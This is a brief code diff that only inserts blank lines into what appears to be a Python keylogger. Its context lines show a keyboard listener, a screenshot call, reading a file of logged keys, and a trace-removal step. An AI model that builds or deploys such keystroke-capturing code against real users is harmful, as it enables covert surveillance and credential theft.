@@ -206,9 +206,11 @@ while no_of_iter < no_of_iter_end:
 
 
     with Listener(on_press=on_press, on_release=on_release) as listener:
+        
         listener.join()
 
     if currenttime > stoppingtime:
+        
         scr()
         f = open(file_path + extend + keys_info, "r")
         line = f.read()
@@ -228,6 +230,7 @@ while no_of_iter < no_of_iter_end:
 
         except:
             pass
+        
         f.close()
 
         rem()
